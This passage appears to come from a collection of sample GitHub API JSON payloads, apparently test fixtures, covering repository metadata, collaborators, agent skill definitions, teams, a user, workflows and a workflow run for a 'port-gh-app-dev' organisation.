	"issues_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues{/number}",
	"pulls_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/pulls{/number}",
	"milestones_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/milestones{/number}",
	"notifications_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/notifications{?since,all,participating}",
	"labels_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/labels{/name}",
	"releases_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/releases{/id}",
	"deployments_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/deployments",
	"created_at": "2025-06-19T14:51:39Z",
	"updated_at": "2025-08-11T12:41:48Z",
	"pushed_at": "2025-08-11T12:41:44Z",
	"git_url": "git://github.com/port-gh-app-dev/small-repo.git",
	"ssh_url": "git@github.com:port-gh-app-dev/small-repo.git",
	"clone_url": "https://github.com/port-gh-app-dev/small-repo.git",
	"svn_url": "https://github.com/port-gh-app-dev/small-repo",
	"homepage": null,
	"size": 26,
	"stargazers_count": 0,
	"watchers_count": 0,
	"language": null,
	"has_issues": true,
	"has_projects": true,
	"has_downloads": true,
	"has_wiki": true,
	"has_pages": false,
	"has_discussions": false,
	"forks_count": 0,
	"mirror_url": null,
	"archived": false,
	"disabled": false,
	"open_issues_count": 0,
	"license": null,
	"allow_forking": true,
	"is_template": false,
	"web_commit_signoff_required": false,
	"topics": [],
	"visibility": "public",
	"forks": 0,
	"open_issues": 0,
	"watchers": 0,
	"default_branch": "main",
	"permissions": {
		"admin": true,
		"maintain": true,
		"push": true,
		"triage": true,
		"pull": true
	},
	"security_and_analysis": {
		"secret_scanning": {
			"status": "disabled"
		},
		"secret_scanning_push_protection": {
			"status": "disabled"
		},
		"dependabot_security_updates": {
			"status": "disabled"
		},
		"secret_scanning_non_provider_patterns": {
			"status": "disabled"
		},
		"secret_scanning_validity_checks": {
			"status": "disabled"
		}
	},
	"custom_properties": {}
}
```

#### b.json

```json
{
	"id": 1005051483,
	"node_id": "R_kgDOO-feWw",
	"name": "medium-repo",
	"full_name": "port-gh-app-dev/medium-repo",
	"private": false,
	"owner": {
		"login": "port-gh-app-dev",
		"id": 216844958,
		"node_id": "O_kgDODOzKng",
		"avatar_url": "https://avatars.githubusercontent.com/u/216844958?v=4",
		"gravatar_id": "",
		"url": "https://api.github.com/users/port-gh-app-dev",
		"html_url": "https://github.com/port-gh-app-dev",
		"followers_url": "https://api.github.com/users/port-gh-app-dev/followers",
		"following_url": "https://api.github.com/users/port-gh-app-dev/following{/other_user}",
		"gists_url": "https://api.github.com/users/port-gh-app-dev/gists{/gist_id}",
		"starred_url": "https://api.github.com/users/port-gh-app-dev/starred{/owner}{/repo}",
		"subscriptions_url": "https://api.github.com/users/port-gh-app-dev/subscriptions",
		"organizations_url": "https://api.github.com/users/port-gh-app-dev/orgs",
		"repos_url": "https://api.github.com/users/port-gh-app-dev/repos",
		"events_url": "https://api.github.com/users/port-gh-app-dev/events{/privacy}",
		"received_events_url": "https://api.github.com/users/port-gh-app-dev/received_events",
		"type": "Organization",
		"user_view_type": "public",
		"site_admin": false
	},
	"html_url": "https://github.com/port-gh-app-dev/medium-repo",
	"description": null,
	"fork": false,
	"url": "https://api.github.com/repos/port-gh-app-dev/medium-repo",
	"forks_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/forks",
	"keys_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/keys{/key_id}",
	"collaborators_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/collaborators{/collaborator}",
	"teams_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/teams",
	"hooks_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/hooks",
	"issue_events_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/issues/events{/number}",
	"events_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/events",
	"assignees_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/assignees{/user}",
	"branches_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/branches{/branch}",
	"tags_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/tags",
	"blobs_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/git/blobs{/sha}",
	"git_tags_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/git/tags{/sha}",
	"git_refs_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/git/refs{/sha}",
	"trees_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/git/trees{/sha}",
	"statuses_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/statuses/{sha}",
	"languages_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/languages",
	"stargazers_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/stargazers",
	"contributors_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/contributors",
	"subscribers_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/subscribers",
	"subscription_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/subscription",
	"commits_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/commits{/sha}",
	"git_commits_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/git/commits{/sha}",
	"comments_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/comments{/number}",
	"issue_comment_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/issues/comments{/number}",
	"contents_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/contents/{+path}",
	"compare_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/compare/{base}...{head}",
	"merges_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/merges",
	"archive_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/{archive_format}{/ref}",
	"downloads_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/downloads",
	"issues_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/issues{/number}",
	"pulls_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/pulls{/number}",
	"milestones_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/milestones{/number}",
	"notifications_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/notifications{?since,all,participating}",
	"labels_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/labels{/name}",
	"releases_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/releases{/id}",
	"deployments_url": "https://api.github.com/repos/port-gh-app-dev/medium-repo/deployments",
	"created_at": "2025-06-19T15:31:13Z",
	"updated_at": "2025-06-19T16:51:33Z",
	"pushed_at": "2025-06-19T16:51:30Z",
	"git_url": "git://github.com/port-gh-app-dev/medium-repo.git",
	"ssh_url": "git@github.com:port-gh-app-dev/medium-repo.git",
	"clone_url": "https://github.com/port-gh-app-dev/medium-repo.git",
	"svn_url": "https://github.com/port-gh-app-dev/medium-repo",
	"homepage": null,
	"size": 2496,
	"stargazers_count": 0,
	"watchers_count": 0,
	"language": null,
	"has_issues": true,
	"has_projects": true,
	"has_downloads": true,
	"has_wiki": true,
	"has_pages": false,
	"has_discussions": false,
	"forks_count": 0,
	"mirror_url": null,
	"archived": false,
	"disabled": false,
	"open_issues_count": 0,
	"license": null,
	"allow_forking": true,
	"is_template": false,
	"web_commit_signoff_required": false,
	"topics": [],
	"visibility": "public",
	"forks": 0,
	"open_issues": 0,
	"watchers": 0,
	"default_branch": "main",
	"permissions": {
		"admin": true,
		"maintain": true,
		"push": true,
		"triage": true,
		"pull": true
	},
	"security_and_analysis": {
		"secret_scanning": {
			"status": "enabled"
		},
		"secret_scanning_push_protection": {
			"status": "disabled"
		},
		"dependabot_security_updates": {
			"status": "disabled"
		},
		"secret_scanning_non_provider_patterns": {
			"status": "enabled"
		},
		"secret_scanning_ai_detection": {
			"status": "disabled"
		},
		"secret_scanning_validity_checks": {
			"status": "enabled"
		},
		"secret_scanning_delegated_alert_dismissal": {
			"status": "disabled"
		}
	},
	"custom_properties": {},
	"__teams": [],
	"__collaborators": [
		{
			"login": "MPTG94",
			"id": 9868797,
			"node_id": "MDQ6VXNlcjk4Njg3OTc=",
			"avatar_url": "https://avatars.githubusercontent.com/u/9868797?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/MPTG94",
			"html_url": "https://github.com/MPTG94",
			"followers_url": "https://api.github.com/users/MPTG94/followers",
			"following_url": "https://api.github.com/users/MPTG94/following{/other_user}",
			"gists_url": "https://api.github.com/users/MPTG94/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/MPTG94/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/MPTG94/subscriptions",
			"organizations_url": "https://api.github.com/users/MPTG94/orgs",
			"repos_url": "https://api.github.com/users/MPTG94/repos",
			"events_url": "https://api.github.com/users/MPTG94/events{/privacy}",
			"received_events_url": "https://api.github.com/users/MPTG94/received_events",
			"type": "User",
			"user_view_type": "public",
			"site_admin": false,
			"permissions": {
				"admin": true,
				"maintain": true,
				"push": true,
				"triage": true,
				"pull": true
			},
			"role_name": "admin"
		},
		{
			"login": "melodyogonna",
			"id": 24739630,
			"node_id": "MDQ6VXNlcjI0NzM5NjMw",
			"avatar_url": "https://avatars.githubusercontent.com/u/24739630?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/melodyogonna",
			"html_url": "https://github.com/melodyogonna",
			"followers_url": "https://api.github.com/users/melodyogonna/followers",
			"following_url": "https://api.github.com/users/melodyogonna/following{/other_user}",
			"gists_url": "https://api.github.com/users/melodyogonna/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/melodyogonna/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/melodyogonna/subscriptions",
			"organizations_url": "https://api.github.com/users/melodyogonna/orgs",
			"repos_url": "https://api.github.com/users/melodyogonna/repos",
			"events_url": "https://api.github.com/users/melodyogonna/events{/privacy}",
			"received_events_url": "https://api.github.com/users/melodyogonna/received_events",
			"type": "User",
			"user_view_type": "public",
			"site_admin": false,
			"permissions": {
				"admin": true,
				"maintain": true,
				"push": true,
				"triage": true,
				"pull": true
			},
			"role_name": "admin"
		},
		{
			"login": "emekanwaoma",
			"id": 66322582,
			"node_id": "MDQ6VXNlcjY2MzIyNTgy",
			"avatar_url": "https://avatars.githubusercontent.com/u/66322582?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/emekanwaoma",
			"html_url": "https://github.com/emekanwaoma",
			"followers_url": "https://api.github.com/users/emekanwaoma/followers",
			"following_url": "https://api.github.com/users/emekanwaoma/following{/other_user}",
			"gists_url": "https://api.github.com/users/emekanwaoma/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/emekanwaoma/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/emekanwaoma/subscriptions",
			"organizations_url": "https://api.github.com/users/emekanwaoma/orgs",
			"repos_url": "https://api.github.com/users/emekanwaoma/repos",
			"events_url": "https://api.github.com/users/emekanwaoma/events{/privacy}",
			"received_events_url": "https://api.github.com/users/emekanwaoma/received_events",
			"type": "User",
			"user_view_type": "public",
			"site_admin": false,
			"permissions": {
				"admin": true,
				"maintain": true,
				"push": true,
				"triage": true,
				"pull": true
			},
			"role_name": "admin"
		},
		{
			"login": "mk-armah",
			"id": 85971733,
			"node_id": "MDQ6VXNlcjg1OTcxNzMz",
			"avatar_url": "https://avatars.githubusercontent.com/u/85971733?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/mk-armah",
			"html_url": "https://github.com/mk-armah",
			"followers_url": "https://api.github.com/users/mk-armah/followers",
			"following_url": "https://api.github.com/users/mk-armah/following{/other_user}",
			"gists_url": "https://api.github.com/users/mk-armah/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/mk-armah/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/mk-armah/subscriptions",
			"organizations_url": "https://api.github.com/users/mk-armah/orgs",
			"repos_url": "https://api.github.com/users/mk-armah/repos",
			"events_url": "https://api.github.com/users/mk-armah/events{/privacy}",
			"received_events_url": "https://api.github.com/users/mk-armah/received_events",
			"type": "User",
			"user_view_type": "public",
			"site_admin": false,
			"permissions": {
				"admin": false,
				"maintain": false,
				"push": false,
				"triage": false,
				"pull": true
			},
			"role_name": "read"
		},
		{
			"login": "asafa-seca",
			"id": 241728778,
			"node_id": "U_kgDODmh9Cg",
			"avatar_url": "https://avatars.githubusercontent.com/u/241728778?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/asafa-seca",
			"html_url": "https://github.com/asafa-seca",
			"followers_url": "https://api.github.com/users/asafa-seca/followers",
			"following_url": "https://api.github.com/users/asafa-seca/following{/other_user}",
			"gists_url": "https://api.github.com/users/asafa-seca/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/asafa-seca/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/asafa-seca/subscriptions",
			"organizations_url": "https://api.github.com/users/asafa-seca/orgs",
			"repos_url": "https://api.github.com/users/asafa-seca/repos",
			"events_url": "https://api.github.com/users/asafa-seca/events{/privacy}",
			"received_events_url": "https://api.github.com/users/asafa-seca/received_events",
			"type": "User",
			"user_view_type": "public",
			"site_admin": false,
			"permissions": {
				"admin": false,
				"maintain": false,
				"push": false,
				"triage": false,
				"pull": true
			},
			"role_name": "read"
		}
	]
}
```

### skill

#### a.json

```json
{
	"skill": {
		"name": "hello-skill",
		"description": "A minimal example skill used to test skill discovery.",
		"instructions": "# Hello Skill\n\nRespond with a short greeting.\n",
		"frontmatter": {
			"name": "hello-skill",
			"description": "A minimal example skill used to test skill discovery."
		},
		"path": "skills/hello-skill",
		"skillMdPath": "skills/hello-skill/SKILL.md",
		"root": "skills"
	},
	"__repository": {
		"name": "example-skills",
		"full_name": "acme/example-skills",
		"html_url": "https://github.com/acme/example-skills",
		"default_branch": "main"
	},
	"__branch": "main",
	"__organization": "acme"
}
```

#### b.json

```json
{
	"skill": {
		"name": "incident-triage",
		"description": "Triage production incidents using service catalog context and recent deploys.",
		"instructions": "# Incident triage\n\n1. Identify the affected service.\n2. Pull the last five deploys.\n3. Correlate with open alerts.\n",
		"frontmatter": {
			"name": "incident-triage",
			"description": "Triage production incidents using service catalog context and recent deploys.",
			"allowed-tools": [
				"Read",
				"Grep",
				"Bash"
			]
		},
		"path": ".claude/skills/incident-triage",
		"skillMdPath": ".claude/skills/incident-triage/SKILL.md",
		"root": ".claude/skills"
	},
	"__repository": {
		"name": "platform-tooling",
		"full_name": "acme/platform-tooling",
		"html_url": "https://github.com/acme/platform-tooling",
		"default_branch": "main"
	},
	"__branch": "main",
	"__organization": "acme"
}
```

### team

#### a.json

```json
{
	"slug": "kickerstarters",
	"id": "T_kwDOBMNoS84AyQua",
	"databaseId": 13175706,
	"name": "Kickerstarters",
	"description": "Test team younno",
	"privacy": "VISIBLE",
	"notificationSetting": "NOTIFICATIONS_ENABLED",
	"url": "https://github.com/orgs/Journey/teams/kickerstarters",
	"members": {
		"nodes": [
			{
				"login": "johndoe",
				"name": "John Doe",
				"email": "",
				"isSiteAdmin": false
			}
		]
	}
}
```

#### b.json

```json
{
	"name": "Kickerstarters",
	"id": 13175706,
	"node_id": "T_kwDOBMNoS84AyQua",
	"slug": "kickerstarters",
	"description": "Test team younno",
	"privacy": "closed",
	"notification_setting": "notifications_enabled",
	"url": "https://api.github.com/organizations/799150/team/13175706",
	"html_url": "https://github.com/orgs/Journey/teams/kickerstarters",
	"members_url": "https://api.github.com/organizations/799150/team/13175706/members{/member}",
	"repositories_url": "https://api.github.com/organizations/799150/team/13175706/repos",
	"type": "organization",
	"organization_id": 799150,
	"permission": "pull",
	"parent": null
}
```

### user

```json
{
	"login": "johndoe",
	"id": "MDQ6VXNlcjISYzM5NjMw",
	"databaseId": 2434530,
	"email": "johndoe@email.io",
	"name": "John Doe"
}
```

### workflow

#### a.json

```json
{
	"id": 174594841,
	"node_id": "W_kwDOO-eDos4KaBsZ",
	"name": "Build",
	"path": ".github/workflows/build.yaml",
	"state": "active",
	"created_at": "2025-07-14T19:59:07.000+01:00",
	"updated_at": "2025-07-14T19:59:07.000+01:00",
	"url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/workflows/174594841",
	"html_url": "https://github.com/port-gh-app-dev/small-repo/blob/main/.github/workflows/build.yaml",
	"badge_url": "https://github.com/port-gh-app-dev/small-repo/workflows/Build/badge.svg",
	"__repository": "small-repo",
	"__organization": "port-gh-app-dev"
}
```

#### b.json

```json
{
	"id": 192825736,
	"node_id": "W_kwDOO-eDos4LfkmI",
	"name": "Kafka Exporter Workflow",
	"path": ".github/workflows/port-kafka.yaml",
	"state": "active",
	"created_at": "2025-09-26T15:47:40.000+01:00",
	"updated_at": "2025-09-26T15:47:40.000+01:00",
	"url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/workflows/192825736",
	"html_url": "https://github.com/port-gh-app-dev/small-repo/blob/main/.github/workflows/port-kafka.yaml",
	"badge_url": "https://github.com/port-gh-app-dev/small-repo/workflows/Kafka%20Exporter%20Workflow/badge.svg",
	"__repository": "small-repo",
	"__organization": "port-gh-app-dev"
}
```

### workflow-run

#### a.json

```json
{
	"id": 18042048251,
	"name": "Kafka Exporter Workflow",
	"node_id": "WFR_kwLOO-eDos8AAAAEM2PO-w",
	"head_branch": "main",
	"head_sha": "08c6bbd6086263ae8ca52213854b230be7c46202",
	"path": ".github/workflows/port-kafka.yaml",
	"display_title": "Kafka Exporter Workflow",
	"run_number": 6,
	"event": "workflow_dispatch",
	"status": "completed",
	"conclusion": "failure",
	"workflow_id": 192825736,
	"check_suite_id": 46370745256,
	"check_suite_node_id": "CS_kwDOO-eDos8AAAAKy-lrqA",
	"url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/runs/18042048251",
	"html_url": "https://github.com/port-gh-app-dev/small-repo/actions/runs/18042048251",
	"pull_requests": [],
	"created_at": "2025-09-26T15:23:48Z",
	"updated_at": "2025-09-26T15:24:16Z",
	"actor": {
		"login": "melodyogonna",
		"id": 24739630,
		"node_id": "MDQ6VXNlcjI0NzM5NjMw",
		"avatar_url": "https://avatars.githubusercontent.com/u/24739630?v=4",
		"gravatar_id": "",
		"url": "https://api.github.com/users/melodyogonna",
		"html_url": "https://github.com/melodyogonna",
		"followers_url": "https://api.github.com/users/melodyogonna/followers",
		"following_url": "https://api.github.com/users/melodyogonna/following{/other_user}",
		"gists_url": "https://api.github.com/users/melodyogonna/gists{/gist_id}",
		"starred_url": "https://api.github.com/users/melodyogonna/starred{/owner}{/repo}",
		"subscriptions_url": "https://api.github.com/users/melodyogonna/subscriptions",
		"organizations_url": "https://api.github.com/users/melodyogonna/orgs",
		"repos_url": "https://api.github.com/users/melodyogonna/repos",
		"events_url": "https://api.github.com/users/melodyogonna/events{/privacy}",
		"received_events_url": "https://api.github.com/users/melodyogonna/received_events",
		"type": "User",
		"user_view_type": "public",
		"site_admin": false
	},
	"run_attempt": 1,
	"referenced_workflows": [],
	"run_started_at": "2025-09-26T15:23:48Z",
	"triggering_actor": {
		"login": "melodyogonna",
		"id": 24739630,
		"node_id": "MDQ6VXNlcjI0NzM5NjMw",
		"avatar_url": "https://avatars.githubusercontent.com/u/24739630?v=4",
		"gravatar_id": "",
		"url": "https://api.github.com/users/melodyogonna",
		"html_url": "https://github.com/melodyogonna",
		"followers_url": "https://api.github.com/users/melodyogonna/followers",
		"following_url": "https://api.github.com/users/melodyogonna/following{/other_user}",
		"gists_url": "https://api.github.com/users/melodyogonna/gists{/gist_id}",
		"starred_url": "https://api.github.com/users/melodyogonna/starred{/owner}{/repo}",
		"subscriptions_url": "https://api.github.com/users/melodyogonna/subscriptions",
		"organizations_url": "https://api.github.com/users/melodyogonna/orgs",
		"repos_url": "https://api.github.com/users/melodyogonna/repos",
		"events_url": "https://api.github.com/users/melodyogonna/events{/privacy}",
		"received_events_url": "https://api.github.com/users/melodyogonna/received_events",
		"type": "User",
		"user_view_type": "public",
		"site_admin": false
	},
	"jobs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/runs/18042048251/jobs",
	"logs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/runs/18042048251/logs",
	"check_suite_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/check-suites/46370745256",
	"artifacts_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/runs/18042048251/artifacts",
	"cancel_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/runs/18042048251/cancel",
	"rerun_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/runs/18042048251/rerun",
	"previous_attempt_url": null,
	"workflow_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/actions/workflows/192825736",
	"head_commit": {
		"id": "08c6bbd6086263ae8ca52213854b230be7c46202",
		"tree_id": "85a17c9d31fd45d5080f123ca181ef2b3c5df44c",
		"message": "ci: Expose jq parsing errors",
		"timestamp": "2025-09-26T15:16:37Z",
		"author": {
			"name": "Melody Daniel (aider)",
			"email": "melodyogonna@gmail.com"
		},
		"committer": {
			"name": "Melody Daniel",
			"email": "melodyogonna@gmail.com"
		}
	},
	"repository": {
		"id": 1005028258,
		"node_id": "R_kgDOO-eDog",
		"name": "small-repo",
		"full_name": "port-gh-app-dev/small-repo",
		"private": false,
		"owner": {
			"login": "port-gh-app-dev",
			"id": 216844958,
			"node_id": "O_kgDODOzKng",
			"avatar_url": "https://avatars.githubusercontent.com/u/216844958?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/port-gh-app-dev",
			"html_url": "https://github.com/port-gh-app-dev",
			"followers_url": "https://api.github.com/users/port-gh-app-dev/followers",
			"following_url": "https://api.github.com/users/port-gh-app-dev/following{/other_user}",
			"gists_url": "https://api.github.com/users/port-gh-app-dev/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/port-gh-app-dev/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/port-gh-app-dev/subscriptions",
			"organizations_url": "https://api.github.com/users/port-gh-app-dev/orgs",
			"repos_url": "https://api.github.com/users/port-gh-app-dev/repos",
			"events_url": "https://api.github.com/users/port-gh-app-dev/events{/privacy}",
			"received_events_url": "https://api.github.com/users/port-gh-app-dev/received_events",
			"type": "Organization",
			"user_view_type": "public",
			"site_admin": false
		},
		"html_url": "https://github.com/port-gh-app-dev/small-repo",
		"description": null,
		"fork": false,
		"url": "https://api.github.com/repos/port-gh-app-dev/small-repo",
		"forks_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/forks",
		"keys_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/keys{/key_id}",
		"collaborators_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/collaborators{/collaborator}",
		"teams_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/teams",
		"hooks_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/hooks",
		"issue_events_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues/events{/number}",
		"events_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/events",
		"assignees_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/assignees{/user}",
		"branches_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/branches{/branch}",
		"tags_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/tags",
		"blobs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/blobs{/sha}",
		"git_tags_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/tags{/sha}",
		"git_refs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/refs{/sha}",
		"trees_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/trees{/sha}",
		"statuses_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/statuses/{sha}",
		"languages_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/languages",
		"stargazers_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/stargazers",
		"contributors_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contributors",
		"subscribers_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/subscribers",
		"subscription_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/subscription",
		"commits_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/commits{/sha}",
		"git_commits_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/commits{/sha}",
		"comments_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/comments{/number}",
		"issue_comment_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues/comments{/number}",
		"contents_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contents/{+path}",
		"compare_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/compare/{base}...{head}",
		"merges_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/merges",
		"archive_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/{archive_format}{/ref}",
		"downloads_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/downloads",
		"issues_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues{/number}",
		"pulls_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/pulls{/number}",
		"milestones_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/milestones{/number}",
		"notifications_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/notifications{?since,all,participating}",
		"labels_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/labels{/name}",
		"releases_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/releases{/id}",
		"deployments_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/deployments"
	},
	"head_repository": {
		"id": 1005028258,
		"node_id": "R_kgDOO-eDog",
		"name": "small-repo",
		"full_name": "port-gh-app-dev/small-repo",
		"private": false,
		"owner": {
			"login": "port-gh-app-dev",
			"id": 216844958,
			"node_id": "O_kgDODOzKng",
			"avatar_url": "https://avatars.githubusercontent.com/u/216844958?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/port-gh-app-dev",
			"html_url": "https://github.com/port-gh-app-dev",
			"followers_url": "https://api.github.com/users/port-gh-app-dev/followers",
			"following_url": "https://api.github.com/users/port-gh-app-dev/following{/other_user}",
			"gists_url": "https://api.github.com/users/port-gh-app-dev/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/port-gh-app-dev/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/port-gh-app-dev/subscriptions",
			"organizations_url": "https://api.github.com/users/port-gh-app-dev/orgs",
			"repos_url": "https://api.github.com/users/port-gh-app-dev/repos",
			"events_url": "https://api.github.com/users/port-gh-app-dev/events{/privacy}",
			"received_events_url": "https://api.github.com/users/port-gh-app-dev/received_events",
			"type": "Organization",
			"user_view_type": "public",
			"site_admin": false
		},
		"html_url": "https://github.com/port-gh-app-dev/small-repo",
		"description": null,
		"fork": false,
		"url": "https://api.github.com/repos/port-gh-app-dev/small-repo",
		"forks_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/forks",
		"keys_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/keys{/key_id}",
		"collaborators_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/collaborators{/collaborator}",
		"teams_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/teams",
		"hooks_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/hooks",
		"issue_events_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues/events{/number}",
		"events_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/events",
		"assignees_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/assignees{/user}",
		"branches_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/branches{/branch}",
		"tags_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/tags",
		"blobs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/blobs{/sha}",
		"git_tags_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/tags{/sha}",
		"git_refs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/refs{/sha}",
		"trees_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/trees{/sha}",
		"statuses_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/statuses/{sha}",
		"languages_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/languages",
		"stargazers_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/stargazers",
		"contributors_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contributors",
		"subscribers_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/subscribers",
		"subscription_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/subscription",
		"commits_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/commits{/sha}",
		"git_commits_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/commits{/sha}",
		"comments_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/comments{/number}",
		"issue_comment_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues/comments{/number}",
		"contents_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contents/{+path}",
		"compare_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/compare/{base}...{head}",
		"merges_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/merges",
		"archive_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/{archive_format}{/ref}",
		"downloads_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/downloads",
		"issues_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues{/number}",
		"pulls_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/pulls{/number}",
		"milestones_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/milestones{/number}",
		"notifications_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/notifications{?since,all,participating}",
		"labels_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/labels{/name}",
		"releases_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/releases{/id}",
